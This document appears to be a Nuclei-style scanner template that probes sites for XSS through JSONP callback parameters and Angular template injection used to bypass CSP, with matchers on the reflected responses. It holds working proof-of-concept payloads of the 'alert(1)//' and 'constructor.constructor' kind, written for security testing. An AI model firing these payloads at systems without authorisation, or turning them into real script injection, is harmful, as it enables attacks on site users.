id: m7-xss-csp-bypass
info:
  name: M7 - XSS CSP Bypass via JSONP/Angular
  author: Sharlix
  severity: medium
  description: Tests XSS via CSP bypass using JSONP endpoints and Angular ng-app
  tags: xss,csp,bypass,jsonp,m7hunter

requests:
  - method: GET
    path:
      - "{{BaseURL}}?callback=alert(1)//"
      - "{{BaseURL}}/jsonp?cb=alert(1)//"
      - "{{BaseURL}}/api?jsonp=alert(1)//"
      - "{{BaseURL}}?angular={{constructor.constructor('alert(1)')()}}"
      - "{{BaseURL}}?q={{7*7}}"

    matchers-condition: or
    matchers:
      - type: regex
        regex:
          - "^alert\(1\)//\("
          - "^alert\(1\)//\{"
        part: body
        condition: or

      - type: word
        words:
          - "49"
        part: body

      - type: word
        words:
          - "ng-app"
          - "ng-controller"
        part: body
